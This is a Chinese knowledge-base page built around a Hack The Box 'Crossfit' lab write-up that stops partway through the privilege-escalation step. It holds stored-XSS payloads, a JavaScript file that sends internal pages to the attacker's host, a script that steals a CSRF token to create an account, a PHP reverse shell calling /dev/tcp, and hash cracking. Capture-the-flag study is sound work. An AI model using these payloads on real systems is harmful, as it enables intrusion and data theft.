---
title: 浏览器上下文与跨权限操作
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/xss/
categories:
- Web安全
- 浏览器与XSS
tags:
- 知识库
- XSS
- 命令注入
- 计划任务
- SSH
- Moodle
- FreeBSD
- CVE-2020-14321
description: XSS 的影响取决于受害者当前身份、浏览器可达接口以及后续服务器处理。本章保留 Crossfit 和 Schooled 的脚本、请求和角色变化，让浏览器行为与服务端证据对应起来。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

XSS 的影响取决于受害者当前身份、浏览器可达接口以及后续服务器处理。本章保留 Crossfit 和 Schooled 的脚本、请求和角色变化，让浏览器行为与服务端证据对应起来。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/xss/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Crossfit 记录读取页面、构造操作与后台任务，后续还有独立的密钥分析。

Schooled 的教师会话与 Moodle 角色连接插件执行，FreeBSD 包管理器形成后半链。

其他包含 XSS 的复合案例在对应主题中保留原链，可从主题索引交叉定位。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [受害浏览器请求与任务执行](#case-crossfit) | crossfit | XSS、命令注入、计划任务、SSH |
| [教学平台角色边界与插件执行](#case-schooled) | schooled | XSS、Moodle、FreeBSD、CVE-2020-14321 |

<a id="case-crossfit"></a>

## 受害浏览器请求与任务执行

XSS 承接管理页面操作，后续分析 PHP 参数转义、数据库任务及进程。随机数生成器和 ed25519 密钥分支保留逆向与脚本证据。

<p class="kb-provenance">来源 crossfit · 原记录 2020-11-28 · 57 个代码块 · 4 处图片引用</p>

<details class="kb-evidence" id="record-crossfit">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start crossfit -->

#### introduce

OS: Linux
Difficulty: Insane
Points:	50
Release:	19 Sep 2020
IP:	10.10.10.208

User Blood haqpl	00 days, 15 hours, 52 mins, 14 seconds.
Root Blood haqpl	01 days, 00 hours, 25 mins, 20 seconds.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb126.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### information gathering

first use nmap as usaul

``` bash
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# nmap -sV -v -p- --min-rate=10000 10.10.10.208
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: Host: Cross; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Port-80

There is a default apache web server page.

I use gobuster but nothing interesting found.

And also ftp anonymous login is not allowed.

So i run nmap again for a specific port.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# nmap -sC -sV -p 21 -vvv 10.10.10.208
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 2.0.8 or later
| ssl-cert: Subject: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US/emailAddress=info@gym-club.crossfit.htb
| Issuer: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US/emailAddress=info@gym-club.crossfit.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-30T19:16:46
| Not valid after:  3991-08-16T19:16:46
| MD5:   557c 36e4 424b 381e eb17 708a 6138 bd0f
| SHA-1: 25ec d2fe 6c9d 7704 ec7d d792 8767 4bc3 8d0e cbce
| -----BEGIN CERTIFICATE-----
| MIID0TCCArmgAwIBAgIUFlxL1ZITpUBfx69st7fRkJcsNI8wDQYJKoZIhvcNAQEL
| BQAwdzELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAk5ZMRcwFQYDVQQKDA5Dcm9zcyBG
| aXQgTHRkLjEXMBUGA1UEAwwOKi5jcm9zc2ZpdC5odGIxKTAnBgkqhkiG9w0BCQEW
| GmluZm9AZ3ltLWNsdWIuY3Jvc3NmaXQuaHRiMCAXDTIwMDQzMDE5MTY0NloYDzM5
| OTEwODE2MTkxNjQ2WjB3MQswCQYDVQQGEwJVUzELMAkGA1UECAwCTlkxFzAVBgNV
| BAoMDkNyb3NzIEZpdCBMdGQuMRcwFQYDVQQDDA4qLmNyb3NzZml0Lmh0YjEpMCcG
| CSqGSIb3DQEJARYaaW5mb0BneW0tY2x1Yi5jcm9zc2ZpdC5odGIwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDgibxJvtPny7Vee6M0BFBPFBohEQ+0zLDq
| LdkW/OSl4tfEdZYn6U5cNYKTyYJ8CuytGlMpFw5OgOBPATtBYoGrQZdlN+7LQwF+
| CZsedPs30ijAhygI7pM5S0hwiqdVReR/hhFHD/zry3M5+9NGeDLPgLbQG8qgPspv
| Y+ErCXXotxVI+VrTPfGkjPixfgUTYsEetrkmXlig0S2ukxmNs7HXkjli4Z+qpGrn
| mpFQokBE6RlD6VjxPzx0pfgK587s7F0/pIfXTHGfIOMnqXuLKBXsYIAEjJQxlLUt
| U3lb7aZdqIZnvhTuzuOxFUIe5dRWyfERyODEd5WUlwsbY4Qo2HhZAgMBAAGjUzBR
| MB0GA1UdDgQWBBTG3S2NuuXiSQ4dRvDnLqiWQdvY7jAfBgNVHSMEGDAWgBTG3S2N
| uuXiSQ4dRvDnLqiWQdvY7jAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUA
| A4IBAQB/tGKHZ9oXsqLGGW0wRRgCZj2adl1sq3S69e9R4yVQW7zU2Sw38CAA/O07
| MEgbqrzUI0c/T+Wb1D+gRamCUxSB7FXfMzGRhwUqMsLp8uGNlxyDcMU34ecRwOil
| r4jLmfeGyok1r8CFHg8Om1TeZfzNeVtkAkqf3XoIxbKQk4s779n/84FAtLkZNqyb
| cSv8nnClQQSlf42P3AiRBbwM1Cx9SyKq977sIwOzKTOM4NcSivNdtov+Pc0z+T9I
| 95SsqLKtO/8T0h6hgY6JQG1+A4ivnlZ8nqSFWYsnX10lJN2URlAwXUYuTw0vCMy+
| Xk0OmbR/oG052H02ZsmfJQhqPNF1
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
Service Info: Host: Cross
```

So with the help of nmap we find 1 sub-domain Let's add this in our /etc/hosts file.

nano /etc/hosts

``` bash
10.10.10.208      gym-club.crossfit.htb
```

Let's go to http://gym-club.crossfit.htb/.

After some enumeration i find a comment form let's try something in that.

First i capture the request in my burp and try various thing like XSS.

I change User-Agent feild and comment feild to ping my python simpleHttpServer.

http://gym-club.crossfit.htb/blog-single.php

``` bash
<script src="http://10.10.14.8:8001/"></script>
```

``` bash
POST /blog-single.php HTTP/1.1

Host: gym-club.crossfit.htb

User-Agent: <script src="http://10.10.14.8:8001/"></script>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 154

Origin: http://gym-club.crossfit.htb

Connection: close

Referer: http://gym-club.crossfit.htb/blog-single.php

Upgrade-Insecure-Requests: 1



name=lucifer11&email=1185151867%40qq.com&phone=17746608760&message=<script src="http://10.10.14.8:8001/"></script>&submit=submit
```

``` bash
┌──(root💀kali)-[~]
└─# python -m SimpleHTTPServer 8001                                                                           
Serving HTTP on 0.0.0.0 port 8001 ...
10.10.10.208 - - [28/Nov/2020 08:19:27] "GET / HTTP/1.1" 200 -
```

Now i try everything but nothing work so think about other ways that we need to attack ftp.crossfit.htb.

But the question is where he find that subdomain.

After some hit and try i understand that we need to find that from localhost (using XSS) can see another vhost that only accepts resquest from the local machine and the host is ftp.crossfit.htb that thinking about.

 - [Create a HTTP Request in JS](https://mincong.io/2018/06/19/sending-http-request-from-browser/)

With the help of this article i find my way to communicate with ftp.crossfit.htb.

So what we do now we create a .js file called luci.js that give the response page of the ftp.crossfit.htb in our python server.

Let's try this real quick.

#### step 1

Create a file called luci.js

 - luci.js

``` bash
myhttpserver = 'http://10.10.14.8/'
targeturl = 'http://ftp.crossfit.htb/'

req = new XMLHttpRequest;
req.onreadystatechange = function() {
    if (req.readyState == 4) {
            req2 = new XMLHttpRequest;
            req2.open('GET', myhttpserver + btoa(this.responseText),false);
            req2.send();
        }
}
req.open('GET', targeturl, false);
req.send();
```

#### step 2

Open a python simple http server in your working directory were the luci.js file exist.

``` bash
python3 -m http.server 80
```

Now capture the request of comment form and send it to the repeater tab and add the value that show in the image.

``` bash
<script src="http://10.10.14.8/luci.js"></script>
```

burp request:

``` bash
POST /blog-single.php HTTP/1.1

Host: gym-club.crossfit.htb

User-Agent: <script src="http://10.10.14.8/luci.js"></script>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 93

Origin: http://gym-club.crossfit.htb

Connection: close

Referer: http://gym-club.crossfit.htb/blog-single.php

Upgrade-Insecure-Requests: 1



name=lucifer11&email=1185151867%40qq.com&phone=17746608760&message=%3Cscript%3E&submit=submit
```

Let's send the request and check our python server.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.208 - - [28/Nov/2020 08:45:54] "GET /luci.js HTTP/1.1" 200 -
10.10.10.208 - - [28/Nov/2020 08:45:55] code 404, message File not found
10.10.10.208 - - [28/Nov/2020 08:45:55] "GET /PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+RlRQIEhvc3RpbmcgLSBBY2NvdW50IE1hbmFnZW1lbnQ8L3RpdGxlPgogICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvdHdpdHRlci1ib290c3RyYXAvNC4wLjAtYWxwaGEvY3NzL2Jvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CjwvaGVhZD4KPGJvZHk+Cgo8YnI+CjxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctMTIgbWFyZ2luLXRiIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icHVsbC1sZWZ0Ij4KICAgICAgICAgICAgICAgIDxoMj5GVFAgSG9zdGluZyAtIEFjY291bnQgTWFuYWdlbWVudDwvaDI+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJwdWxsLXJpZ2h0Ij4KICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJidG4gYnRuLXN1Y2Nlc3MiIGhyZWY9Imh0dHA6Ly9mdHAuY3Jvc3NmaXQuaHRiL2FjY291bnRzL2NyZWF0ZSI+IENyZWF0ZSBOZXcgQWNjb3VudDwvYT4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCiAgICAKICAgIDx0YWJsZSBjbGFzcz0idGFibGUgdGFibGUtYm9yZGVyZWQiPgogICAgICAgIDx0cj4KICAgICAgICAgICAgPHRoPk5vPC90aD4KICAgICAgICAgICAgPHRoPlVzZXJuYW1lPC90aD4KICAgICAgICAgICAgPHRoPkNyZWF0aW9uIERhdGU8L3RoPgogICAgICAgICAgICA8dGggd2lkdGg9IjI4MHB4Ij5BY3Rpb248L3RoPgogICAgICAgIDwvdHI+CgogICAgICAgIAogICAgPC90YWJsZT4KCiAgICAKCjwvZGl2PgoKPC9ib2R5Pgo8L2h0bWw+Cg== HTTP/1.1" 404 -
```

It give us a base64 string.

Let's decode this and see what inside.

``` bash
<!DOCTYPE html>

<html>
<head>
    <title>FTP Hosting - Account Management</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css" rel="stylesheet">
</head>
<body>

<br>
<div class="container">
        <div class="row">
        <div class="col-lg-12 margin-tb">
            <div class="pull-left">
                <h2>FTP Hosting - Account Management</h2>
            </div>
            <div class="pull-right">
                <a class="btn btn-success" href="http://ftp.crossfit.htb/accounts/create"> Create New Account</a>
            </div>
        </div>
    </div>

    
    <table class="table table-bordered">
        <tr>
            <th>No</th>
            <th>Username</th>
            <th>Creation Date</th>
            <th width="280px">Action</th>
        </tr>

        
    </table>

    

</div>

</body>
</html>
```

It's a html code for ftp.crossfit.htb wepsite.

If you not conform Let's open this in browser.

It's a FTP Hosting - Account Management page.

Let's create new user.

But first Let's check what is the url when we click on create new account.

``` bash
http://ftp.crossfit.htb/accounts/create
```

let's add this in our luci.js and check how's the page look on ftp.crossfit.htb/accounts/create

luci.js

``` bash
myhttpserver = 'http://10.10.14.8/'
targeturl = 'http://ftp.crossfit.htb/accounts/create'

req = new XMLHttpRequest;
req.onreadystatechange = function() {
    if (req.readyState == 4) {
            req2 = new XMLHttpRequest;
            req2.open('GET', myhttpserver + btoa(this.responseText),false);
            req2.send();
        }
}
req.open('GET', targeturl, false);
req.send();
```

Let's send the request again in burp.

And we got the response.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.208 - - [28/Nov/2020 08:55:42] "GET /luci.js HTTP/1.1" 200 -
10.10.10.208 - - [28/Nov/2020 08:55:42] code 404, message File not found
10.10.10.208 - - [28/Nov/2020 08:55:42] "GET /PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+RlRQIEhvc3RpbmcgLSBBY2NvdW50IE1hbmFnZW1lbnQ8L3RpdGxlPgogICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvdHdpdHRlci1ib290c3RyYXAvNC4wLjAtYWxwaGEvY3NzL2Jvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CjwvaGVhZD4KPGJvZHk+Cgo8YnI+CjxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAKPGRpdiBjbGFzcz0icm93Ij4KICAgIDxkaXYgY2xhc3M9ImNvbC1sZy0xMiBtYXJnaW4tdGIiPgogICAgICAgIDxkaXYgY2xhc3M9InB1bGwtbGVmdCI+CiAgICAgICAgICAgIDxoMj5BZGQgTmV3IEFjY291bnQ8L2gyPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InB1bGwtcmlnaHQiPgogICAgICAgICAgICA8YSBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IiBocmVmPSJodHRwOi8vZnRwLmNyb3NzZml0Lmh0Yi9hY2NvdW50cyI+IEJhY2s8L2E+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KPC9kaXY+CgoKPGZvcm0gYWN0aW9uPSJodHRwOi8vZnRwLmNyb3NzZml0Lmh0Yi9hY2NvdW50cyIgbWV0aG9kPSJQT1NUIj4KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Il90b2tlbiIgdmFsdWU9IkJobURaQWlMN0JDc01kbnRvOXIwTnlyVW5yTldQcFhZRE1HbEVtQ08iPgogICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIGNvbC1zbS0xMiBjb2wtbWQtMTIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICAgIDxzdHJvbmc+VXNlcm5hbWU6PC9zdHJvbmc+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlcm5hbWUiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHBsYWNlaG9sZGVyPSJVc2VybmFtZSI+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiBjb2wtc20tMTIgY29sLW1kLTEyIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CiAgICAgICAgICAgICAgICA8c3Ryb25nPlBhc3N3b3JkOjwvc3Ryb25nPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtMTIgY29sLXNtLTEyIGNvbC1tZC0xMiB0ZXh0LWNlbnRlciI+CiAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+U3VibWl0PC9idXR0b24+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCjwvZm9ybT4KCjwvZGl2PgoKPC9ib2R5Pgo8L2h0bWw+Cg== HTTP/1.1" 404 -
```

Again decode it and open in browser.

``` bash
<!DOCTYPE html>

<html>
<head>
    <title>FTP Hosting - Account Management</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css" rel="stylesheet">
</head>
<body>

<br>
<div class="container">
    
<div class="row">
    <div class="col-lg-12 margin-tb">
        <div class="pull-left">
            <h2>Add New Account</h2>
        </div>
        <div class="pull-right">
            <a class="btn btn-primary" href="http://ftp.crossfit.htb/accounts"> Back</a>
        </div>
    </div>
</div>


<form action="http://ftp.crossfit.htb/accounts" method="POST">
    <input type="hidden" name="_token" value="BhmDZAiL7BCsMdnto9r0NyrUnrNWPpXYDMGlEmCO">
     <div class="row">
        <div class="col-xs-12 col-sm-12 col-md-12">
            <div class="form-group">
                <strong>Username:</strong>
                <input type="text" name="username" class="form-control" placeholder="Username">
            </div>
        </div>
        <div class="col-xs-12 col-sm-12 col-md-12">
            <div class="form-group">
                <strong>Password:</strong>
                <input type="password" name="pass" class="form-control" placeholder="Password">
            </div>
        </div>
        <div class="col-xs-12 col-sm-12 col-md-12 text-center">
                <button type="submit" class="btn btn-primary">Submit</button>
        </div>
    </div>

</form>

</div>

</body>
</html>
```

There is two field username and password.

But the tricky part is if you see the source code there is a hidden value called _token which value dynamically change so if we create a payload to register user we need to grep the _token value from web page.

After some hit and try create a payload to register user.

createuser.js

``` bash
myhttpserver = 'http://10.10.14.8'
targeturl = 'http://ftp.crossfit.htb/accounts/create'
username = 'luci'
password = 'lucifer11'

req = new XMLHttpRequest;
req.withCredentials = true;
req.onreadystatechange = function() {
    if (req.readyState == 4) {
        req2 = new XMLHttpRequest;
        req2.open('GET', myhttpserver + btoa(this.responseText), false);
        req2.send();
    }
}
req.open('GET', targeturl, false);
req.send();

regx = /token" value="(.*)"/g;
token = regx.exec(req.responseText)[1];

var params = '_token=' + token + '&username=' + username + '&pass=' + password + '&submit=submit'
req.open('POST', "http://ftp.crossfit.htb/accounts", false);
req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
req.send(params);
```

Now send the req in burp with this createuser.js file like this.

``` bash
<script src="http://10.10.14.8/createuser.js"></script>
```

``` bash
POST /blog-single.php HTTP/1.1

Host: gym-club.crossfit.htb

User-Agent: <script src="http://10.10.14.8/createuser.js"></script>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 93

Origin: http://gym-club.crossfit.htb

Connection: close

Referer: http://gym-club.crossfit.htb/blog-single.php

Upgrade-Insecure-Requests: 1



name=lucifer11&email=1185151867%40qq.com&phone=17746608760&message=%3Cscript%3E&submit=submit
```
Let's check the python listner.

and receive the response:

``` bash
10.10.10.208 - - [28/Nov/2020 09:05:09] "GET /createuser.js HTTP/1.1" 200 -
```

And i use lftp to connect with ftp.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# lftp
lftp :~> set ftp:ssl-force true
lftp :~> connect 10.10.10.208
lftp 10.10.10.208:~> set ssl:verify-certificate no 
lftp 10.10.10.208:~> login luci
密码: 
lftp luci@10.10.10.208:~> ls
drwxrwxr-x    2 33       1002         4096 Sep 21 09:45 development-test
drwxr-xr-x   13 0        0            4096 May 07  2020 ftp
drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club
drwxr-xr-x    2 0        0            4096 May 01  2020 html
lftp luci@10.10.10.208:/>
```

We find another sub-domain called: development-test.crossfit.htb

Let's add this in our /etc/hosts file.

If you closely see that we have read and write access of development-test directory.

So that mean we can upload a php reverse shell and execute it with our rev.js file.

#### step 1

Create a file called rev.php.

rev.php

``` bash
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.8/9988 0>&1'") ?>
```

#### step 2

Create another file called rev.js that will execute our rev.php.

rev.js

``` bash
req = new XMLHttpRequest;
req.open('GET',"http://development-test.crossfit.htb/rev.php");
req.send();
```

#### step 3

Start you python server on the same directory were all files exist and netcat Listener.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# ls
createuser.js  luci.js  rev.js  rev.php
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

``` bash
┌──(root💀kali)-[~]
└─# nc -lvp 9988
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9988
Ncat: Listening on 0.0.0.0:9988
```

#### step 4

upload the rev.php in ftp development-test directory.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# lftp                                                                                                      
lftp :~> set ftp:ssl-force true
lftp :~> connect 10.10.10.208
lftp 10.10.10.208:~> set ssl:verify-certificate no
lftp 10.10.10.208:~> login luci
密码: 
lftp luci@10.10.10.208:~> ls
drwxrwxr-x    2 33       1002         4096 Sep 21 09:45 development-test
drwxr-xr-x   13 0        0            4096 May 07  2020 ftp
drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club
drwxr-xr-x    2 0        0            4096 May 01  2020 html
lftp luci@10.10.10.208:/> cd development-test
lftp luci@10.10.10.208:/development-test> ls
lftp luci@10.10.10.208:/development-test> put rev.php
69 bytes transferred in 12 seconds (6 B/s)       
lftp luci@10.10.10.208:/development-test> ls
-rw-r--r--    1 1002     1002           69 Nov 28 14:30 rev.php
```

#### step 5

Go to burp repeater tab and edit it to rev.js and send it:

``` bash
POST /blog-single.php HTTP/1.1

Host: gym-club.crossfit.htb

User-Agent: <script src="http://10.10.14.8/rev.js"></script>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 90

Origin: http://gym-club.crossfit.htb

Connection: close

Referer: http://gym-club.crossfit.htb/blog-single.php

Upgrade-Insecure-Requests: 1



name=dcasdc&email=casdcasdcd%40qq.com&phone=17746608760&message=%3Cscript%3E&submit=submit
```

Now let's see our netcat listner

``` bash
10.10.10.208 - - [28/Nov/2020 09:29:23] "GET /rev.js HTTP/1.1" 200 -
```

``` bash
┌──(root💀kali)-[~]
└─# nc -lvp 9988
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9988
Ncat: Listening on 0.0.0.0:9988
Ncat: Connection from 10.10.10.208.
Ncat: Connection from 10.10.10.208:37118.
id
bash: cannot set terminal process group (712): Inappropriate ioctl for device
bash: no job control in this shell
www-data@crossfit:/var/www/development-test$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@crossfit:/var/www/development-test$ whoami
whoami
www-data
```

Boom we got the shell as www-data.

Now let's run the linPEAS.

 - [LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

``` bash
www-data@crossfit:/var/www/development-test$ ./linpeas.sh > info
./linpeas.sh > info
ls: cannot access '/etc/hosts.denied': No such file or directory
grep: write error: Broken pipe
www-data@crossfit:/var/www/development-test$
```

After analyze the output i found two interesting things.

First is crontabs

They run send_updates.php file that's look suspicious.

``` bash
MAILTO=""
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*  *    * * *   isaac   /usr/bin/php /home/isaac/send_updates/send_updates.php
```

Second is 2 hashes in the linPEAS result.

``` bash
[+] Looking for specific hashes inside files - less false positives (limit 70)
/etc/ansible/playbooks/adduser_hank.yml:$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/
/var/www/ftp/database/factories/UserFactory.php:$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi
```

Let's try to crack this hashes

I save this hashes in a file called hash

hash

``` bash
$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/
$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi
```

Let's crack it with john.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# john -w=/usr/share/wordlists/rockyou.txt hash
Warning: only loading hashes of type "sha512crypt", but also saw type "bcrypt"
Use the "--format=bcrypt" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
powerpuffgirls   (?)
1g 0:00:00:05 DONE (2020-11-28 09:51) 0.1919g/s 4618p/s 4618c/s 4618C/s tajmahal..hunibuni
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And we got the password called powerpuffgirls

And this hash is for hank user that we see in linPEAS result.

Let's try to ssh in and got our user.txt flag.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# ssh hank@10.10.10.208
hank@10.10.10.208's password: 
Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Mon Sep 21 05:46:24 2020 from 10.10.14.2
hank@crossfit:~$ ls
user.txt
hank@crossfit:~$ cat user.txt
d6ce5237244a14992edde7f0b62b6076
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb127.jpg)

#### Privilege escalation

Let's check crontabs first.

``` bash
hank@crossfit:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

MAILTO=""
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)                                                                                                
# |  .------------- hour (0 - 23)                                                                                                  
# |  |  .---------- day of month (1 - 31)                                                                                          
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...                                                                          
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat                                             
# |  |  |  |  |                                                                                                                    
# *  *  *  *  * user-name command to be executed                                                                                   
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly                                                                
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )                                
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )                               
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )                              
*  *    * * *   isaac   /usr/bin/php /home/isaac/send_updates/send_updates.php
```

there is a send_updates.php file which we see in the previous linPEAS result.

Let's check what inside the send_updates.php.

``` bash
hank@crossfit:~$ cat /home/isaac/send_updates/send_updates.php
<?php
/***************************************************
 * Send email updates to users in the mailing list *
 ***************************************************/
require("vendor/autoload.php");
require("includes/functions.php");
require("includes/db.php");
require("includes/config.php");
use mikehaertl\shellcommand\Command;

if($conn)
{
    $fs_iterator = new FilesystemIterator($msg_dir);

    foreach ($fs_iterator as $file_info)
    {
        if($file_info->isFile())
        {
            $full_path = $file_info->getPathname(); 
            $res = $conn->query('SELECT email FROM users');
            while($row = $res->fetch_array(MYSQLI_ASSOC))
            {
                $command = new Command('/usr/bin/mail');
                $command->addArg('-s', 'CrossFit Club Newsletter', $escape=true);
                $command->addArg($row['email'], $escape=true);

